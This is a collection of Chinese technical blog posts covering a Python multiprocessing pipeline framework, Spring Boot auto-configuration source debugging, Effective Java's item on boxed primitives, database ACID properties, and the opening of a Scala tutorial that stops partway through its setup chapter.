起因是这样的，组内有一个需求，需要挖掘视频中的检测难样本，这样可以极大地减少标注的量，从而降低成本。难样本挖掘的策略，简单来说就是如果视频的前几帧和后几帧都能检测到目标，而就只有当前帧没有检测到，就说明当前帧很可能存在漏检（没有检测本到该检测到的目标）；反之，如果前后都没有检测到目标，而当前帧检测到了，那就很可能是误检（检测到不是目标的东西）。
    
初步的方案是这样的，我们先把视频抽帧，直接用FFMpeg就可以方便的完成。然后调用现在的检测器，进行逐帧的检测，把检测结果存下来。最后写个脚本，分析检测的结果，然后输出可能有问题的帧，然后这些帧就会进行送标（发给标注员进行标注）。最终我们就只需要标注一些比较hard的样本就行了。
 
但是这样会带来很多的问题，最显著的两个：1. 需要保存大量的中间结果（图片帧）；2. 必须依次完成每一步之后，才能得到最终的结果。
 
这时候，相比大家都知道了该如何去解决。对的，我们应该用流水线作业的方式去进行。
    
首先我们可以将每部分任务并行的去处理。抽帧之后的结果送入队列；之后检测模块从队列取帧，检测之后将结果送入下一个队列；最后一个队列得到检测结果，再做最终的分析。相比于之前的方式，这样可以尽量的减少中间的结果。
 
实现该方案，只需要使用最简单的生产者消费者队列即可以完成。所以说，相信大家都十分了解了。对于上面的逻辑，我们需要的队列的数目和我们的模块数是正相关的。如果单纯的进行实现的话，实在的太麻烦了，给队列命名都要我们绞尽脑汁了。所以，为了更优雅的编写代码，这里就推出本文标题中的Easy Pipeline框架。
 
首先，我们举个最简单的例子来说明该框架的工作模式。输入一个数字的序列，按要求对他们进行加减乘除的操作（这里的每个操作，其实可以等价于前面的抽帧或是检测的更复杂的操作 ），并且支持每个操作的进程数。
 
from easy_pipeline import SimplePipeline, PipelineItem, Task, StopTask, EmptyTask
import multiprocessing as mp

# define our Task
class NumTask(Task):
    def __init__(self, x):
        super(NumTask, self).__init__()
        self.val = x

# init function, here we use closure to get different function
def get_init_fn(x):
    def init():
        return x
    return init

# operations
def plus(res, task):
    return NumTask(task.val + res)

def mul(res, task):
    return NumTask(task.val * res)

def minus(res, task):
    return NumTask(task.val - res)

def div(res, task):
    return NumTask(task.val / res)

if __name__ == '__main__':

    # job queue
    manager = mp.Manager()
    job_queue = manager.Queue(1000)

    # define pipeline and start

    # x = （(x + 1) * 2 - 3）/ 5
    pipeline_items = [
        PipelineItem(plus, get_init_fn(1), 1, 10),      # plus 1
        PipelineItem(mul, get_init_fn(2), 2, 10),       # mul 2
        PipelineItem(minus, get_init_fn(3), 3, 10),     # minus 3
        PipelineItem(div, get_init_fn(5.), 4, 10),      # div 5
    ]

    pipeline = SimplePipeline(pipeline_items, job_queue)
    pipeline.start()
    result_queue = pipeline.get_result_queue()

    # Feed jobs anytime (before StopTask)
    for i in range(10):
        job_queue.put(NumTask(i))

    # get partial output
    print('Get Output Start')
    for i in range(5):
        result = result_queue.get()
        if isinstance(result, StopTask):
            print("get stop task")
            break
        if isinstance(result, EmptyTask):
            continue
        print(result.val)
    print('Get Output End')
    
    # Feed jobs anytime (before StopTask)
    for i in range(10, 20):
        job_queue.put(NumTask(i))

    # Stop pipeline, means no more job will be added then.
    # Every process will exit when it has done all current jobs in job_queue
    pipeline.stop()

    # get all output
    print('Get Output Start')
    while True:
        result = result_queue.get()
        if isinstance(result, StopTask):
            print("Output Queue Empty")
            break
        if isinstance(result, EmptyTask):
            continue
        print(result.val)
    print('Get Output End')
 
下面，我们来简单的说明一下工作逻辑。
 

首先，我们需要定义自己的任务Task。只需要继承Task这个类即可，内部可以存放自己喜欢的任何数据。这里只是为了计算，所以就只存放了一个数字。
定义我们的初始化函数和工作函数。初始化函数的作用是给每个进程初始化一些资源，如果不需要也可以不要。这里的初始化函数就是返回了一个值，表示操作数。工作函数是最重要的函数，他会处理接收到的Task，处理并返回新的Task（新的Task可以理解为处理的结果）。工作函数有两个输入，一个是资源，即初始化函数的返回值，另一个就是Task本身。
构建Pipeline。每个工作模块都只需要用PipelineItem这个对象进行封装即可。器参数分别是：工作函数、初始化函数、进程数、结果队列的长度（-1表示不限长度）。结果队列的长度，通常设置为较大的值即可。因为不能的模块的处理速度可能不同，因此很容易出现结果堆积的现象，如果不支持队列长度，会导致内存的大量的占用。最后将PipelineItem的数组和输入的对垒传给SimplePipeline对象即可构建完我们的整套Pipeline程序了！
启动Pipeline程序，并输入数据。
得到结果！完事了，优秀。

 
上面这是一个最简单的例子，可以比较直观的感受到这个框架的便捷之处。完全屏蔽掉对队列，并发等的操作。
 
在我推荐给同事之后，确实一定程度地减小他的工作量，但同时，他也向我反馈了一些问题：这个框架在某些地方有些比较灵活的设计，应该给出足够多的实例，才能方便实用。关于该框架的设计思路和实例，将会在下一篇博客中进行详细介绍。
 
最后，欢迎大家Star和提交MR。愿与你们一同进步。

https://www.cnblogs.com/idiotgroup/p/10583779.html
**************************************************
SpringBoot自动配置源码调试
　　之前对SpringBoot的自动配置原理进行了较为详细的介绍（https://www.cnblogs.com/stm32stm32/p/10560933.html），接下来就对自动配置进行源码调试，探究下这个配置过程中各参数的情况。
　　这里对AutoConfigurationImportSelector类的selectImports()方法打了4处断点，将着重对这4处进行调试。

第一处断点：

该方法的源码如下：

 这一步就是将META-INF/spring-autoconfigure-metadata.properties文件中的键值对放入AutoConfigurationMetadataLoader的内部类PropertiesAutoConfigurationMetadata的Properties对象中，共有485个元素。

第二处断点：

这个方法的源码如下：

其中的name就是org.springframework.boot.autoconfigure.EnableAutoConfiguration类：

下面的方法中的metadata.getAnnotationAttributes(name, true)获取到的值如下：


这里还利用断言进行attributes是否为null判断，若为null，则提示No auto-configuration attributes found. Is com.SpringboothuifuApplication annotated with EnableAutoConfiguration ？

最终得到的attributes为：

第三处断点：

getCandidateConfigurations方法定义如下：

其中的getSpringFactoriesLoaderFactoryClass()返回的是EnableAutoConfiguration.class。

进入loadFacotryNames()方法进行调试：

factoryClassName的值为org.springframework.boot.autoconfigure.EnableAutoConfiguration。
常量FACTORIES_RESOURCE_LOCATION = "META-INF/spring.factories"。
下面的方法通过类加载器获取jar包中所有META-INF/spring.factories并获取其中的内容：

最后的urls包含扫描到3个jar包中有spring.factories文件：

接下来对urls进行3次遍历：
第一次遍历的文件路径url=jar:file:/C:/Users/Alan/.m2/repository/org/springframework/boot/spring-boot/1.5.17.RELEASE/spring-boot-1.5.17.RELEASE.jar!/META-INF/spring.factories
通过Properties properties = PropertiesLoaderUtils.loadProperties(new UrlResource(url));得到的properties对象的大小为7：

因为上述properties并不存在org.springframework.boot.autoconfigure.EnableAutoConfiguration的key，
 所以String factoryClassNames = properties.getProperty(factoryClassName);得到的factoryClassNames为null
 
此时存放自动配置类的list集合result的大小仍然为0。
第二次遍历的文件路径url=jar:file:/C:/Users/Alan/.m2/repository/org/springframework/boot/spring-boot-autoconfigure/1.5.17.RELEASE/spring-boot-autoconfigure-1.5.17.RELEASE.jar!/META-INF/spring.factories
该文件也有7个键值对，新生成的properties大小为7：

此时properties.getProperty(factoryClassName)将能找到key=org.springframework.boot.autoconfigure.EnableAutoConfiguration的属性键值对。
factoryClassNames此时包含了org.springframework.boot.autoconfigure.EnableAutoConfiguration对应的value值，最后全部添加到list集合里面，共有96个值（Arrays.asList转换得到）：

第三次遍历jar:file:/C:/Users/Alan/.m2/repository/org/springframework/spring-beans/4.3.20.RELEASE/spring-beans-4.3.20.RELEASE.jar!/META-INF/spring.factories
但是里面仍然没有org.springframework.boot.autoconfigure.EnableAutoConfiguration的key，所以result里面并没有添加新元素。
 总共进行了3次遍历，分别是下面3个jar包包含spring.factories文件：
1、spring-boot-1.5.17.RELEASE.jar
2、spring-boot-autoconfigure-1.5.17.RELEASE.jar
3、spring-beans-4.3.20.RELEASE.jar
而上述3个jar的spring.factories只有spring-boot-autoconfigure-1.5.17.RELEASE.jar中包含org.springframework.boot.autoconfigure.EnableAutoConfiguration的key，这样就把需要自动配置的候选类都找出并放入list集合中。
接着还会用断言判断configurations是否有元素，否则提示：No auto configuration classes found in META-INF/spring.factories. If you  are using a custom packaging, make sure that file is correct.

最后返回自动配置类的list集合对象configurations。
第四处断点：

 filter方法传入了2个参数：
1、configurations：读取MEAT-INF/spring.factories文件得到的经过排除得到的自动配置类名的list集合

2、autoConfigurationMetadata：读取META-INF/spring-autoconfigure-metadata.properties文件得到的485个键值对。

候选自动配置类数组candidates 由configurations转数组而来：String[] candidates = configurations.toArray(new String[configurations.size()]);其值如下：

for循环中的getAutoConfigurationImportFilters定义如下：

里面的SpringFactoriesLoader.loadFactories()方法定义如下：

上述方法主要目的是找寻spring.factories文件中key=org.springframework.boot.autoconfigure.AutoConfigurationImportFilter对应的值，
这里依然进行了3次遍历，分别是下面3个jar包包含spring.factories文件1、spring-boot-1.5.17.RELEASE.jar2、spring-boot-autoconfigure-1.5.17.RELEASE.jar3、spring-beans-4.3.20.RELEASE.jar而上述3个jar的spring.factories只有spring-boot-autoconfigure-1.5.17.RELEASE.jar中包含了org.springframework.boot.autoconfigure.AutoConfigurationImportFilter的key。
 通过loadFactoryNames(factoryClass, classLoaderToUse)得到的factoryNames为org.springframework.boot.autoconfigure.condition.OnClassCondition类。

接着遍历factoryNames，调用instantiateFactory方法，利用反射生成condition.OnClassCondition的实例添加到result集合中：

最后对result进行排序并返回：AnnotationAwareOrderComparator.sort(result);

getAutoConfigurationImportFilters()分析完了，我们继续看for循环：

上面的invokeAwareMethods(filter)方法根据filter是否实现了相关接口，对其进行了设置：

filter满足instance instanceof Aware、instance instanceof BeanClassLoaderAware、instance instanceof BeanFactoryAware。
接下来我们着重看下match方法：

上述方法调用了OnClassCondition类的match方法：

 传入的参数是之前排除过自动配置类，目前还有96个：

下面的方法利用autoConfigurationMetadata对象对autoConfigurationClasses进行处理，autoConfigurationMetadata是加载META-INF/spring-autoconfigure-metadata.properties得到的485个元素，autoConfigurationClasses是读取META-INF/spring.factories文件key为org.springframework.boot.autoconfigure.EnableAutoConfiguration得到值进行排除、排序、去重等操作得到的候选自动配置类（由于没有添加排除项，目前仍然有96个）。

getOutComes定义如下：

该方法将自动候选配置类分成2半进行条件判断处理，outcomes存入的是条件判断后的结果：

匹配结束后的ConditionEvaluationReport对象report存放了不匹配的结果，从结果中看到候选的96个自动配置类，有72个不满足条件而被过滤：

随便点开一个outcomes元素：
org.springframework.boot.autoconfigure.aop.AopAutoConfiguration -> key=org.springframework.boot.autoconfigure.aop.AopAutoConfiguration；
匹配失败原因：@ConditionalOnClass did not find required classes 'org.aspectj.lang.annotation.Aspect', 'org.aspectj.lang.reflect.Advice'
由于项目没有引入aop的相关依赖，导致类路径中没有Aspect和Advice类，导致AopAutoConfiguration这个自动配置类匹配失败。
(1) META-INF/spring-autoconfigure-metadata.properties文件中的Aop内容：
org.springframework.boot.autoconfigure.aop.AopAutoConfiguration.Configuration=
org.springframework.boot.autoconfigure.aop.AopAutoConfiguration=
org.springframework.boot.autoconfigure.aop.AopAutoConfiguration.ConditionalOnClass=
org.springframework.context.annotation.EnableAspectJAutoProxy,org.aspectj.lang.annotation.Aspect,org.aspectj.lang.reflect.Advice
(2) META-INF/spring.factories中的Aop内容：
org.springframework.boot.autoconfigure.EnableAutoConfiguration=\org.springframework.boot.autoconfigure.aop.AopAutoConfiguration,\
因此spring.factories中的key=org.springframework.boot.autoconfigure.EnableAutoConfiguration对应的值只是候选的自动配置类；能否成功配置，关键还要看是否已经被排除以及是否满足spring-autoconfigure-metadata.properties中对对应配置类的加载条件。若不满足，则该类是会从自动配置类列表中排除，这样能加快springboot的启动速度。spring官方文档（https://docs.spring.io/spring-boot/docs/current/reference/html/boot-features-developing-auto-configuration.html）对该文件的作用描述如下：
Spring Boot uses an annotation processor to collect the conditions on auto-configurations in a metadata file (META-INF/spring-autoconfigure-metadata.properties). If that file is present, it is used to eagerly filter auto-configurations that do not match, which will improve startup time. 
然后根据匹配结果，将真正满足配置条件的配置类放入list集合中  boolean[] skip记录了对应的候选自动配置类是否需要跳过，true-不满足条件，需要跳过，false-满足条件，不需要跳过。

for循环结束，只有24个自动配置真正符合条件：


因此第四处断点走完，真正符合自动配置条件类的自动配置类只有24个了（根据项目配置情况会有所不同）：

至此，SpringBoot自动配置源码调试告一段落，总结如下：
1、读取META-INF/spring-autoconfigure-metadata.properties文件中的内容；
2、获取需要排除的自动配置类；
3、读取spring-boot-autoconfigure-1.5.17.RELEASE.jar中的META-INF/spring.factories文件内容，作为候选自动配置类；
4、对候选自动配置类进行去重、排序、去除所有排除项；
5、利用META-INF/spring-autoconfigure-metadata.properties文件的配置对META-INF/spring.factories经历第四步处理后的候选自动配置类进行过滤，去除不满足加载条件的类，得到最终的自动配置类供SpringBoot加载。

 
https://www.cnblogs.com/stm32stm32/p/10575145.html
**************************************************
Effective Java 第三版——61. 基本类型优于装箱的基本类型

Tips
书中的源代码地址：https://github.com/jbloch/effective-java-3e-source-code
注意，书中的有些代码里方法是基于Java 9 API中的，所以JDK 最好下载 JDK 9以上的版本。


61. 基本类型优于装箱的基本类型
Java是一个由两部分类型组成的系统，一部分由基本类型组成，如int，double和boolean，还有一部分是引用类型，如String和List。 每个基本类型都有一个相应的引用类型，称为装箱基本类型。 对应于int，double和boolean的盒装基元是Integer，Double和Boolean。
正如条目6中提到的，自动装箱和自动拆箱模糊了基本类型和装箱基本类型之间的区别，但不会消除它们。这两者之间有真正的区别，重要的是要始终意识到你正在使用的是哪一种，并在它们之间仔细选择。
基本类型和包装基本类型之间有三个主要区别。首先，基本类型只有它们的值，而包装基本类型具有与其值不同的标识。换句话说，两个包装基本类型实例可以具有相同的值但不同的引用标识。第二，基本类型只有功能的值（functional value），而每个包装基本类型类型除了对应的基本类型的功能值外，还有一个非功能值，即null。最后，基本类型比包装的基本类型更节省时间和空间。如果你不小心的话，这三种差异都会给你带来真正的麻烦。
考虑下面的比较器，它的设计目的是表示Integer值的升序数字顺序。(回想一下，比较器的compare方法返回一个负数、零或正数，这取决于它的第一个参数是小于、等于还是大于第二个参数)。你不需要在实践中编写这个比较器，因为它实现了Integer的自然排序，但它提供了一个有趣的例子:
// Broken comparator - can you spot the flaw?
Comparator<Integer> naturalOrder =
    (i, j) -> (i < j) ? -1 : (i == j ? 0 : 1);
这个比较器看起来应该工作，也能通过很多测试。 例如，它可以与Collections.sort方法一起使用，以正确排序百万个元素列表，无论列表是否包含重复元素。 但这个比较器存在严重缺陷。 为了说服自己，只需打印naturalOrder.compare(new Integer(42)，new Integer(42))的值。 两个Integer实例都表示相同的值（42），因此该表达式的值应为0，但它为1，表示第一个Integer值大于第二个值！
那么问题出在哪里呢？naturalOrder中的第一个测试工作得很好。计算表达式i < j会使i和j引用的整数实例自动拆箱；也就是说，它提取它们的基本类型值。计算的目的是检查得到的第一个int值是否小于第二个int值。但假设是否定的。然后，下一个测试计算表达式i==j，该表达式对两个对象执行引用标识比较。如果i和j引用表示相同整型值的不同Integer实例，这个比较将返回false，比较器将错误地返回1，表明第一个整型值大于第二个整型值。将==操作符应用于装箱的基本类型几乎总是错误的。
在实践中，如果你需要一个比较器来描述类型的自然顺序，应该简单地调用comparator . naturalorder()方法，如果自己编写一个比较器，应该使用比较器构造方法，或者对基本类型使用静态compare方法(条目 14)。也就是说，可以通过添加两个局部变量来存储与装箱Integer参数对应的原始int值，并对这些变量执行所有的比较，从而修复了损坏的比较器中的问题。这样避免了错误的引用一致性比较:
Comparator<Integer> naturalOrder = (iBoxed, jBoxed) -> {
    int i = iBoxed, j = jBoxed; // Auto-unboxing
    return i < j ? -1 : (i == j ? 0 : 1);
};
接下来，考虑一下这个有趣的小程序:
public class Unbelievable {
    static Integer i;

    public static void main(String[] args) {
        if (i == 42)
            System.out.println("Unbelievable");
    }
}
它不会打印出Unbelievable字符串——但它所做的事情几乎同样奇怪。它在计算表达式i==42时抛出NullPointerException。问题是，i是Integer类型，而不是int类型，而且像所有非常量对象引用属性一样，它的初始值为null。当程序计算表达式i==42时，它是在比较Integer和int之间的关系。 几乎在每种情况下，当在基本类型和包装基本类型进行混合操作时，包装基本类型会自动拆箱。如果对一个null对象进行自动拆箱，那么会抛出NullPointerException。正如这个程序所演示的，它几乎可以在任何地方发生。修复这个问题非常简单，只需将i声明为int而不是Integer就可以了。
最后，考虑第24页条目6中的程序:
// Hideously slow program! Can you spot the object creation?
public static void main(String[] args) {
    Long sum = 0L;
    for (long i = 0; i < Integer.MAX_VALUE; i++) {
        sum += i;
    }
    System.out.println(sum);
}
那么，什么时候应该使用装箱原语呢?它们有几个合法的用途。第一个是作为集合中的元素、键和值。不能将原语放在集合中，因此必须使用装箱的原语。这是一般情况下的特例。在参数化类型和方法(第5章)中，必须使用装箱原语作为类型参数，因为该语言不允许使用原语。例如，不能将变量声明为ThreadLocal类型，因此必须使用ThreadLocal。最后，在进行反射方法调用时，必须使用装箱原语(第65项)。
这个程序比它原本的速度慢得多，因为它意外地声明了一个局部变量(sum)，它是装箱的基本类型Long，而不是基本类型long。程序在没有错误或警告的情况下编译，变量被反复装箱和拆箱，导致观察到的性能下降。
在本条目中讨论的所有三个程序中，问题都是一样的:程序员忽略了基本类型和包装基本类型之间的区别，并承担了后果。在前两个项目中，结果是彻底的失败;第三，严重的性能问题。
那么，什么时候应该使用装箱基本类型呢？它们有几个合法的用途。第一个是作为集合中的元素、键和值。不能将基本类型放在集合中，因此必须使用装箱的基本类型。这是一般情况下的特例。在参数化类型和方法(第5章)中，必须使用装箱基本类型作为类型参数，因为该语言不允许使用基本类型。例如，不能将变量声明为ThreadLocal<int>类型，因此必须使用ThreadLocal<Integer>。最后，在进行反射方法调用时，必须使用装箱基本类型(条目 65)。
总之，只要有选择，就应该优先使用基本类型，而不是装箱基本类型。基本类型更简单、更快。如果必须使用装箱基本类型，则需要小心！自动装箱减少了使用装箱基本类型的冗长，但没有降低使用的危险。当程序使用==操作符比较两个装箱的基本类型时，它会执行引用标识比较，这几乎肯定不是你想要的。当程序执行包含装箱和拆箱基本类型的混合类型计算时，它会执行拆箱，当程序执行拆箱时，会抛出NullPointerException。最后，当程序装箱了基本类型，可能会导致代价高昂且创建了不必要的对象。

https://www.cnblogs.com/IcanFixIt/p/10582913.html
**************************************************
分布式事务？咱先弄明白本地事务再说 - ACID



 



















 











过去一段时间面试的同学，对于数据库事务，可以按照配置正常使用，但很多都无法讲清楚和理解数据库事务这个东西真正的意义，以及互联网兴起以后，当今数据库在ACID面前面临怎样的问题和抉择。
事务，是各大单机SQL数据库厂商包括Oracle、IBM DB2等，早在上世纪80年代提出的一个解决 数据并发操作处理的模型 ，旨在满足多用户（多线程、进程）对数据操作的场景下，依然能保证逻辑正确执行，状体持久，且各大厂商提出，并在事务实现上都遵循事务的 ACID 4个特性。
回顾ACID


 

 


















 











一个模块，是多个独立的功能逻辑的组合，每个功能包含多个操作步骤，包括IO、计算、数据库等操作，必须保证每一步都被执行，且执行正确，这个功能和模块才是可用，可交付的。
 


 

 




























那么，如何保证这些操作的完整性，就是Atomic，定义为一个原子操作，全部执行且成功，或者全部失败都不执行（回滚），原子操作如果成功，那状态就必须持久，被称为数据库的Durability，持久性。
原子性A、持久性D，这俩个都比较好理解，定义了事务的边界，行为的开始和行为的结束。
A、D定义了事务的边界，那一致性C、隔离性I，就是对事务中间状态的管理，
 
一致性，也可以理解为是数据的完整性，数据的有效性，我们举例来说明什么是一致性，以及事务是如何保证一致性的，

一个账户减100，另一个账户加100的时候，程序异常crash了，这时候就出现数据的不一致情况，破坏了有效性，这个问题可以由Atomic来保证；
一个原子操作在执行的过程中，涉及多个数据变更的中间状态的保护，例如把A账户减100，在加到B账户完成这个原子操作之前，此时，其他线程对A读的操作就有可能获取到A少100的这个中间状态，这种情况是否允许发生，由Isolation来保证；
数据库延迟约束，例如数据字段的类型、空值、关系、数据范围、主键唯一性等这些合法性的检查都是由Durability来保证，在事务commit时，发现数据不合法，是无法提交成功的。











 
所以，综上所述，一致性C，是数据状态的正确变换的保证，AID，是实现C的手段，也是我们真正要追求的目标。
 
而，隔离性I的设定，就是对一致性C不同程度的破坏，事实上，如果我们顺序对数据进行读写，ACD是完全可用保证的，但这样效率会非常的低下，那，我们是要严格的一致性，还是更高的效率，数据库专家们把这个决定权交给了用户，所以，我们看到，ACID当中，只有隔离性I是用户可以选择的，可以自定义的。隔离性包括 串行读、读已提交、重复读、读未提交 等几种策略，性能由低到高，让用户在不同的使用场景，选择合适的隔离策略，在一致性和性能之间平衡，取得最好的综合表现。
 
小结
本文主要介绍了事务和事务的几个特性，解释了ACID的由来和之间的关系，
总的来说，ACID的核心是C，大家其实都是为得到C而提出的不同纬度的限制和规范，A确定一个功能的完整性，D对状态负责，I可以说是C的等级系数，不同的I的策略，会出现不同的级别的C，AID是数据库本身的功能特性，C由业务层把控，要严格的C，就设置完整的数据库约束和串行隔离，反之，要宽松的C，就放开数据库的约束，使用读未提交的隔离策略，存在即合理，后者更适用于互联网高并发对一致性要求不高的场景，例如分布式的AP系统，可以保证服务整体的响应时间和服务的可用性。
 
https://www.cnblogs.com/xguo/p/10582648.html
**************************************************
大数据技术之_16_Scala学习_01_Scala 语言概述

第一章 Scala 语言概述1.1 why is Scala 语言?1.2 Scala 语言诞生小故事1.3 Scala 和 Java 以及 jvm 的关系分析图1.4 Scala 语言的特点1.5 Windows 下搭建 Scala 开发环境1.6 Linux 下搭建 Scala 开发环境1.7 Scala 的开发工具1.7.1 IDEA介绍1.7.2 Scala 插件安装1.8 Scala 的开发快速入门1.8.1 windows 下开发步骤1.8.2 linux 下开发步骤1.8.3 IDEA 下开发步骤1.8.4 使用 java 写一段模拟代码，来模拟 scala 的执行流程1.8.5 Scala 执行流程分析1.8.6 Scala 程序开发注意事项(重点)1.9 Scala 语言转义字符1.10 Scala 语言输出的三种方式1.11 Scala 源码的查看的关联1.12 注释1.12.1 介绍1.12.2 Scala 中的注释类型1.12.3 文档注释案例1.12.4 scala 的代码规范说明1.12.5 正确的注释和注释风格1.12.6 正确的缩进和空白1.12.7 Scala 官方编程指南1.13 本章知识回顾

第一章 Scala 语言概述
1.1 why is Scala 语言?

1、Spark--新一代内存级大数据计算框架，是大数据的重要内容。2、Spark 就是使用 Scala 编写的。因此为了更好的学习 Spark, 需要掌握 Scala 这门语言。3、Scala 是 Scalable Language 的简写，是一门多范式(范式=编程方式[面向对象/函数式编程])的编程语言。4、联邦理工学院洛桑（EPFL）的 Martin Odersky(马丁·奥德斯基) 于 2001 年开始设计 Scala(斯卡拉)。5、Spark 的兴起，带动 Scala 语言的发展！


1.2 Scala 语言诞生小故事

  创始人马丁·奥德斯基 (Martin Odersky) 是编译器及编程的狂热爱好者，长时间的编程之后，希望发明一种语言，能够让写程序这样的基础工作变得高效、简单。所以当接触到 JAVA 语言后，对 JAVA 这门便携式、运行在网络、且存在垃圾回收的语言产生了极大的兴趣，所以决定将函数式编程语言的特点融合到 JAVA 中，由此发明了两种语言（Pizza & Scala）。 （大量使用递归）  jdk5.0 的泛型、for 循环增强,、自动类型转换等，都是从 Pizza 引入的新特性。  jdk8.0 的类型推断、Lambda 表达式 就是从 scala 引入的特性。  Pizza 和 Scala 极大地推动了 Java 编程语言的发展。[如何理解?]  且现在主流 JVM 的 javac 编译器就是 马丁·奥德斯基 编写出来的。并被 JAVA 编程人员广泛的使用，所以 Scala 语言起源于 Java，却推动着 Java 的发展，它们是相辅相成的。Jdk5.0、Jdk8.0 的编译器就是 马丁·奥德斯基 写的，因此 马丁·奥德斯基 是一个人的战斗力抵得上一个 Java 开发团队。  
  正是基于上面的原因，所以 Scala 源代码 (.scala) 会被编译成 Java 字节码 (.class)，然后运行于 JVM 之上，并可以调用现有的 Java 类库，实现两种语言的无缝对接，因此，对于已经掌握 JAVA 语言的我们来讲，学习起来一定会略显轻松。  Scala 是一门以 java 虚拟机(JVM) 为目标运行环境并将面向对象和函数式编程的最佳特性结合在一起的静态类型编程语言。（运行之前一定知道类型是什么）
 


1.3 Scala 和 Java 以及 jvm 的关系分析图

  一般来说，学 Scala 的人，都会 Java，而 Scala 是基于 Java 的，因此我们需要将 Scala 和 Java 以及 JVM 之间的关系搞清楚，否则学习 Scala 你会蒙圈。  建议：如果没有任何 Java 基础的同学，先学 Java，至少要学习 JavaSE，再学习 Scala。  我们分析一下：Scala 和 Java  以及 jvm 的关系 (重要！！！)  


1.4 Scala 语言的特点

  Scala 是一门以 java 虚拟机(JVM) 为运行环境并将面向对象和函数式编程的最佳特性结合在一起的静态类型编程语言(编译型语言)。（动态类型语言：javascript、python、php 解释型语言）   Scala 是一门多范式 (multi-paradigm) 的编程语言，Scala 支持面向对象和函数式编程。  Scala 源代码 (.scala) 会被编译成 Java 字节码 (.class)，然后运行于 JVM 之上，并可以调用现有的 Java 类库，实现两种语言的无缝对接。[案例演示]  scala 单作为一门语言来看，非常的简洁高效。[对 三元运算，++，-- 等进行简化]  Scala 在设计时，马丁·奥德斯基 是参考了 Java 的设计思想，可以说 Scala 是源于 java，同时 马丁·奥德斯基 也加入了自己的思想，将函数式编程语言的特点融合到 JAVA 中, 因此，对于学习过 Java 的同学，只要在学习 Scala 的过程中，搞清楚 Scala 和 java 相同点和不同点，就可以快速的掌握 Scala 这门语言。  快速有效掌握 Scala 的建议 [1、学习 scala 特有的语法。2、搞清楚 scala 和 java 区别。 3、如何规范的使用 scala。]


1.5 Windows 下搭建 Scala 开发环境
安装&配置  1、Scala 需要 Java 运行时库，安装 Scala 需要首先安装 JVM 虚拟机并配置好，推荐安装 JDK1.8。  2、在 http://www.scala-lang.org/ 下载 Scala2.11.8 程序安装包  3、配置 Jdk 的环境变量  4、配置 SCALA_HOME，SCALA_HOME= D:\program\scala-2.11.8  5、将 Scala 安装目录下的 bin 目录加入到 PATH 环境变量，在 PATH 变量中添加：%SCALA_HOME%\bin  6、在终端中输入 “scala” 命令打开 scala 解释器1、
2、3、
1.6 Linux 下搭建 Scala 开发环境
  在实际开发中，我们的项目是部署到 linux 上，因此，我们需要在 Linux 下搭建 scala 的环境。Linux 下安装 Scala 的原理机制一样，操作的具体步骤：1、下载对应的 scala 的安装软件 scala-2.11.8.tgz2、通过远程登录工具，将安装软件上传到对应的 Linux 系统（xshell6 和 xftp6）3、mkdir /opt/module/scala 创建目录4、解压：$ tar -zvxf /opt/software/scala-2.11.8.tgz -C /opt/module/scala/5、配置环境变量 vim /etc/profile在该文件中配置 scala 的 bin 目录 /opt/module/scala/scala-2.11.8/bin
#SCALA_HOMEexport SCALA_HOME=/opt/module/scala/scala-2.11.8export PATH=$PATH:$SCALA_HOME/bin
6、使配置文件生效 source /etc/profile7、测试，命令：scala

Scala 的 REPL：

  上面打开的 scala 命令行窗口，我们称之为 REPL，是指：Read Evaluation Print Loop，也称之为交互式解释器。类似于 MySQL 的默认客户端工具。在命令行窗口中输入 scala 指令代码时，解释器会读取指令代码并计算（Evaluation）对应的值，然后将结果打印（Print）出来，接着循环等待用户输入指令（Loop）。  从技术上讲，这里其实并不是一个解释器，而是指令代码被快速的编译成 Java 字节码并被 JVM 加载执行。最终将执行结果输出到命令行中。


1.7 Scala 的开发工具
1.7.1 IDEA介绍

  IDEA 全称 IntelliJ IDEA，是用于 java 语言开发的集成环境（也可用于其他语言），IntelliJ 在业界被公认为最好的 java 开发工具之一。IDEA 是 JetBrains 公司的产品，这家公司总部位于捷克共和国的首都布拉格。  java 开发工具很多，比如 netbean、eclipse 等等，单开发 Scala 可选的工具不多，主要使用 IDEA。  Idea 工具开发 Scala 的快捷键也不是很多，所以使用相对比较简单。  IDEA 不是专门用于开发 Scala 的 IDE，但是确是最适合开发 Scala 的工具，因为在我们实际工作中，大部分是开发项目，而大数据项目不可避免的会使用到 Java, 所以会进行 Java 和 Scala 两种语言的混合编程。 而 Idea 可以很好的支持 Java 和 Scala 的开发。  IDEA 的安装与配置详解：https://www.cnblogs.com/chenmingjun/p/10290183.html


1.7.2 Scala 插件安装
  默认情况下 IDEA 不支持 Scala 的开发，需要安装 Scala 插件。操作的具体步骤：1、下载插件：scala-intellij-bin-2017.2.6.zip，下载地址：https://plugins.jetbrains.com/plugin/1347-scala，找到对应的版本2、建议该插件文件放到 scala 的安装目录，我们新建文件夹 /plugin，方便我们管理3、将插件安装到 idea4、打开 idea，先找到安装插件的位置 File -> Settings -> Plugins -> Installplugin from disk… -> 选择插件的路径 -> OK -> OK5、点击 OK，重启 idea
1.8 Scala 的开发快速入门
  需求说明：要求开发一个 Hello.scala 程序，可以输出  “hello world!"  [对 scala 程序基本结构说明]。
1.8.1 windows 下开发步骤
步骤如下：  1、可以直接使用文本开发工具[Sublime Text 3]。  2、将 Scala 代码编写到扩展名为 HelloScala.scala 的文件中。[ 说明: 比如将源码在目录 D:\demo\ScalaDemo 下 ]   3、通过 scalac  命令对该 scala 文件进行编译，生成 .class 文件。[和javac类似]  4、命令行下执行 scala HelloScala 就可以看到运行效果。  5、注意：scala HelloScala 命令可以直接运行 HelloScala.scala 程序。[内部会有编译和运行过程]效果截图：
对 scala 程序基本结构说明：
1.8.2 linux 下开发步骤
步骤如下：  1、直接使用 vim 开发，一个遍历数组的案例。  2、将 Scala 代码编写到扩展名为 HelloScala.scala 的文件中。[代码说明]  3、通过 scala 命令对该 scala 文件进行编译，生成 .class 字节码文件。  4、在终端执行 scala HelloScala 就可以看到运行效果。  5、注意：通过 scala HelloScala 命令可以直接运行 HelloScala.scala 程序。代码如下：
/**  * 只要以后看到 object HelloScala，我们就应该有如下认识：  *     1、object HelloScala 对应的是一个 HelloScala$ 类型的静态对象 MODULE$。  *     2、object HelloScala 在程序运行中是单例存在的。  */object HelloScala {  def main(args: Array[String]): Unit = {    println("hello scala")  }}
1.8.3 IDEA 下开发步骤
